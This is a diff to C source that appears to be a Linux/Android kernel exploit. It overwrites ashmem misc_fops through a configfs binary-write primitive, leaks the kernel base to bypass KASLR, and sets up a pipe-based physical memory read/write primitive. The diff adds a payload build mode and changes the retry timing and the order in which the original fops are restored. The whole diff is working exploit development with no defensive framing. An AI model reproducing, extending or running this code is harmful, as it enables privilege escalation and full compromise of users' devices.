@@ -1,6 +1,10 @@
 #include "common.h"
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define PSELECT_CFI_ROUTE_ATTEMPTS 4
+#else
 #define PSELECT_CFI_ROUTE_ATTEMPTS 24
+#endif
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -16,6 +20,10 @@ int cfi_dirty_seen;
 int cfi_last_step;
 int cfi_last_errno;
 int kaslr_done;
+uint64_t kaslr_base;
+uint64_t kaslr_slide;
+
+#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
 int kaslr_step;
 uint64_t kaslr_fops_alias;
 uint64_t kaslr_open_ptr;
@@ -23,12 +31,12 @@ uint64_t kaslr_ioctl_ptr;
 uint64_t kaslr_mmap_ptr;
 uint64_t kaslr_release_ptr;
 uint64_t kaslr_show_fdinfo_ptr;
-uint64_t kaslr_base;
-uint64_t kaslr_slide;
 uint64_t kaslr_expected_ioctl;
 uint64_t kaslr_expected_mmap;
 uint64_t kaslr_expected_release;
 uint64_t kaslr_expected_show_fdinfo;
+#endif
+
 uint64_t slide_bootid_before;
 uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
@@ -38,21 +46,34 @@ static int route_delay_usec(int attempt) {
   const char *forced = getenv("PSELECT_DELAY_USEC");
   if (forced && *forced) {
     char *end = NULL;
+    errno = 0;
     long value = strtol(forced, &end, 0);
-    if (end != forced && *end == 0 && value >= 0 && value <= 1000000) {
+    if (!errno && end != forced && *end == 0 && value >= 0 && value <= 1000000) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+      static const int offsets[] = {0, 5000, 0, 5000};
+      size_t index = (size_t)(attempt - 1) %
+                     (sizeof(offsets) / sizeof(offsets[0]));
+      return (int)value + offsets[index];
+#else
       return (int)value;
+#endif
     }
   }
-
-  // 就两个值交替
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  static const int delays[] = {
+    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
+  };
+#else
   static const int delays[] = {
     5000, 6000,
   };
+#endif
 
   int count = (int)(sizeof(delays) / sizeof(delays[0]));
   return delays[(attempt - 1) % count];
 }
 
+#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
 static int route_attempt_limit(void) {
   const char *forced = getenv("PSELECT_ROUTE_ATTEMPTS");
   if (forced && *forced) {
@@ -65,15 +86,11 @@ static int route_attempt_limit(void) {
   }
   return PSELECT_CFI_ROUTE_ATTEMPTS;
 }
+#endif
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
   unsigned long *bits = (unsigned long *)set;
   bits[word] = (unsigned long)value;
-}
-
-uint64_t fdset_get_word(const fd_set *set, int word) {
-  const unsigned long *bits = (const unsigned long *)set;
-  return bits[word];
 }
 
 void open_selected_fds(
@@ -120,7 +137,11 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  int attempt_limit = PSELECT_CFI_ROUTE_ATTEMPTS;
+#else
   int attempt_limit = route_attempt_limit();
+#endif
   for (int route_attempt = 1; route_attempt <= attempt_limit;
        route_attempt++) {
     if (route_attempt != 1) {
@@ -214,6 +235,7 @@ int repair_fake_fops_llseek(int fd) {
          after == llseek;
 }
 
+#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
 int refresh_fake_fops_text(int fd) {
   struct fops_slot {
     size_t off;
@@ -283,6 +305,7 @@ int leak_kernel_base(int fd) {
   kaslr_step = 0;
   return 1;
 }
+#endif
 
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
@@ -320,24 +343,21 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = misc_fops_data_addr();
-uint64_t pre_fops = 0;
-ssize_t pre_rb = configfs_read_once(
-    fd, misc_fops, &pre_fops, sizeof(pre_fops));
-fops_before = pre_fops;
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uint64_t pre_fops = 0;
+  ssize_t pre_rb = configfs_read_once(
+      fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  fops_before = pre_fops;
 
-// 只记日志，不判断成败
-if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
-  pr_info("cfi precheck note fd=%d target=%016llx rb=%zd read=%016llx "
-          "want=%016llx page=%016llx fake_parent=%016llx "
-          "fake_right=%016llx bin_target=%016llx\n",
-          fd, (unsigned long long)misc_fops, pre_rb,
-          (unsigned long long)pre_fops, (unsigned long long)fake_fops,
-          (unsigned long long)page_base,
-          (unsigned long long)fake_parent,
-          (unsigned long long)fake_right,
-          (unsigned long long)binwrite_target);
-}
+  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
+               "read=%016llx want=%016zx errno=%d\n",
+               pre_rb, misc_fops, (unsigned long long)pre_fops,
+               fake_fops, errno);
+    cfi_last_step = 4;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
@@ -373,31 +393,66 @@ if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     goto fail;
   }
 
-  uint64_t before = 0;
-  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
-  fops_before = before;
-  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
-    pr_info("cfi postcheck miss fd=%d target=%016llx rb=%zd read=%016llx "
-            "want=%016llx page=%016llx\n",
-            fd, (unsigned long long)misc_fops, rb,
-            (unsigned long long)before, (unsigned long long)fake_fops,
-            (unsigned long long)page_base);
-    cfi_last_step = 4;
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!restore_p0_oracle_pages(fd)) {
+    cfi_last_step = 10;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+#endif
+
+  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
+          misc_fops, (unsigned long long)original_fops);
+  ssize_t restore = configfs_write_once(
+      fd, misc_fops, &original_fops, sizeof(original_fops));
+  cfi_restore_ret = restore;
+  if (restore != (ssize_t)sizeof(original_fops)) {
+    cfi_last_step = 5;
     cfi_last_errno = errno;
     goto fail;
   }
 
+  uint64_t before = 0;
+  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
+  fops_before = before;
+  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
+    cfi_last_step = 6;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
     goto fail;
   }
+#endif
 
-  if (!leak_kernel_base(fd)) {
+  if (!kaslr_done) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
     cfi_last_step = 9;
     cfi_last_errno = errno;
     goto fail;
+#else
+    if (!leak_kernel_base(fd)) {
+      cfi_last_step = 9;
+      cfi_last_errno = errno;
+      goto fail;
+    }
+#endif
   }
+
+  pr_info("cfi starting pipe physrw\n");
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (getenv("P0_ORACLE_DIAG")) {
+    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
+    fflush(NULL);
+    _exit(diagnostic_ok ? 0 : 1);
+  }
+#endif
 
   int installed = 0;
   pipe_stage_attempts = 0;
@@ -418,16 +473,6 @@ if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
 
   if (!installed) {
     cfi_last_step = 8;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-
-  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
-  ssize_t restore = configfs_write_once(
-      fd, misc_fops, &original_fops, sizeof(original_fops));
-  cfi_restore_ret = restore;
-  if (restore != (ssize_t)sizeof(original_fops)) {
-    cfi_last_step = 5;
     cfi_last_errno = errno;
     goto fail;
   }
@@ -459,7 +504,7 @@ if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
+    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
